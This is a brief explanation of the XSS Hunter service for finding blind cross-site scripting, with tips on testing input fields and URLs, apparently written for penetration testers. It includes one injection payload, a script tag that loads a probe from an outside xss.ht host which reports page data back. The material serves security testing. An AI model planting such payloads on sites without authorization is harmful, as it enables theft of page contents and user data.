XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service.

Upon signing up you will create a special xss.ht short domain such as yoursubdomain.xss.ht which identifies your XSS vulnerabilities and hosts your payload. You then use this subdomain in your XSS testing, using injection attempts such as "><script src=//yoursubdomain.xss.ht></script>. XSS Hunter will automatically serve up XSS probes and collect the resulting information when they fire.

Tips:
1) Make sure to for XSS injection in each input box - sometimes one wasn't sanitized even though the others were
2) Make sure to try XSS injection in URL; sometimes the input was only sanitized in the input form boxes and not in the URL; especially for inputs that are drop down menus and you can only manipulate things in the URL
